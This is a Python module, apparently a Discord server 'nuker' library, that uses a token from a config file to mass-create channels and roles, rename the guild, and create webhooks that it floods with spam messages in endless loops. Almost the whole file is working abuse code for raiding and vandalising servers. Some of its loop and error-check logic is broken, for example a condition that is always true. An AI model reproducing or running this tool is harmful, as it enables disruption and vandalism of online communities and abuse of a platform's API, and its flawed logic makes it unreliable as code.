import json
import httpx, logging
from colorama import Fore

logging.basicConfig(level=logging.INFO, format=f"{Fore.YELLOW}[{Fore.RESET}!{Fore.YELLOW}]{Fore.RESET} %(message)s{Fore.RESET}", datefmt=f"%H:%M:%S")

with open('config.json', 'r') as f:
    config = json.load(f)

# all variables
token = config['token']
prefix = config['prefix']
webhooks_name = config['webhooks_name']
webhooks_message = config['webhook_message']
channels_name = config['channels_name']
guild_name = config['guild_name']
roles_name = config['roles_name']
tts = config['tts']
headers = {"authorization": token}
allroles = []

# all functions
def channel_spam(token, guild_id):
   while 0 < 250:
    r = httpx.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers, json={"type": "0", "name": channels_name})
    if r.status_code == 201:
        logging.info(f"Channel Created -> {r.json()['id']}")
    elif "Maxinium number reached":
        logging.info("Maximum number of channels reached (500)")
        break
    else:
        logging.info("Failed to create a channel...")

def roles_spam(token, guild_id):
    while 0 < 250:
     r = httpx.post(f"https://discord.com/api/v9/guilds/{guild_id}/roles", headers=headers, json={"name": roles_name})
     if r.status_code == 200:
        logging.info(f"Role Created -> {r.json()['id']}")
        allroles.append(r.json()['id'])
     elif "Maxinium number reached":
        logging.info("Maximum number of roles reached (250)")
        break
     else:
        logging.info("Failed to create a role...")

def webhook_spam(token, channel_id):
    r = httpx.post(f"https://discord.com/api/v9/channels/{channel_id}/webhooks", headers=headers,  json = {'name': webhooks_name})
    if r.status_code == 200:
     tucanho = r.json()['token']
     idho = r.json()['id']
     while True:
      r = httpx.post(f"https://discord.com/api/webhooks/{idho}/{tucanho}", json = {'content': webhooks_message, 'username': webhooks_name, 'avatar_url': "https://images-na.ssl-images-amazon.com/images/I/51lpm9SpsJL.png", "tts": tts})
      if r.status_code == 200:
       logging.info(f"Spammed in -> https://discord.com/api/webhooks/{idho}/{tucanho[:10]}*****")
      else:
        logging.info(f"Failed to spam in -> https://discord.com/api/webhooks/{idho}/{tucanho[:10]}*****")
          
def change_guild_name(token, guild_id):
    r = httpx.patch(f"https://discord.com/api/v9/guilds/{guild_id}", headers=headers, json={"name": guild_name, "description": "swaps uwu"})
    if r.status_code == 200:
        logging.info(f"Changed guild name -> {guild_id}")   
    else:
        logging.info(f"Failed to change guild name -> {guild_id}")

if __name__ == '__main__':
    logging.info("You can't start this library!")
    input()